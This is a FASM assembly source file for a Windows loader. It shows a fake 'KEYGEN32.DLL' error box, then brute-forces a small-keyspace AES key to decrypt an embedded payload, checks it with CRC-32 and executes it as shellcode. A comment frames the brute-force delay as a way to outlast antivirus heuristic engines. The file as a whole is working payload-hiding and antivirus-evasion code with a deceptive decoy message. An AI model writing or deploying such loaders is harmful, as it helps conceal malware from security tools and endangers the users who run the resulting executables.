format	PE GUI 4.0
entry	start

include	'%FASM%\win32ax.inc'
include	'%FASM%\aes\aes.inc'

TEXTSIZE	= _encrypted_file_size
; How many non-zero bytes was the encryption key
key_size	= 6
key_range	= 10

section	'.text' code readable writeable executable
start:
	; This is just for fun. It can help to evaluate the time an AV heuristic engine works ;-)
	invoke	MessageBox,NULL,Message,Caption,MB_OK+MB_ICONWARNING

	; Brute force a simplified AES-128 key
	mov	edi,key128
	mov	ebx,0
	mov	edx,key_size		; const

	call	bruteforce

	mov	eax,shellcode
	add	eax,4
	call	eax

	invoke	ExitProcess,0

; Brute force function
; edi <-- key
; ebx <-- level
; edx = key_size
; result: eax (0 if successful; -1 if not)
bruteforce:
        cmp     ebx,edx			; if level >= key_size return -1
        jae	.enderror
        xor	ecx,ecx
	; Try every possible number in range 0..key_values-1
.next:
	cmp	ecx,(key_range-1)
	ja	.endloop
        mov     byte [edi+ebx],cl
        push    ebx
	push	ecx
        inc     ebx
	; Make a recursive call with (level + 1)
        call    bruteforce
	pop	ecx
        pop     ebx
        test	eax,eax
        jz	.skip
	cmp	dword [flag],-1
	je	.endloop
	; Try to decrypt with current key
        call    testkey
.skip:
	inc	ecx
	jmp	.next
.endloop:
        xor     eax,eax
        jmp     .endbf
.enderror:
        xor     eax,eax
        dec     eax
.endbf:
        ret

testkey:                        ; key = edi, key_size = edx
	pushad
	; Try to decrypt ciphertext data with the current key
	stdcall	decAES,TEXTSIZE,encrypted_file,shellcode,key128

	; Calculate CRC-32 of decrypted plaintext (exluding checksum field at the beginning)
	mov	esi,shellcode
	add	esi,4
	mov	edi,(_encrypted_file_size-4)
	call	Calc_CRC32

	; If a just-calculated CRC-32 equals to CRC-32 in the checksum field --
	; the decryption was successful, so that payload is in a plaintext now
	cmp	eax,dword [shellcode]
	jnz	.notfoundkey
	mov	dword [flag],-1

.notfoundkey:
	popad
	ret

include	'%FASM%\aes\aes.asm'
include 'crc32.inc'

        Message         db      'Could not load the library: KEYGEN32.DLL',0
        Caption         db      'Error',0

encrypted_file:
	file	'encrypted.dat'
		_encrypted_file_size = $ - encrypted_file
	shellcode rb	_encrypted_file_size
	key128	db	16 dup(0x00)
	flag	dd	0

section	'.idata' import data readable writeable
	library	kernel,'KERNEL32.DLL',user,'USER32.DLL'
	import	kernel,\
		ExitProcess,'ExitProcess'
	import	user,\
		MessageBox,'MessageBoxA'

include 'resource.inc'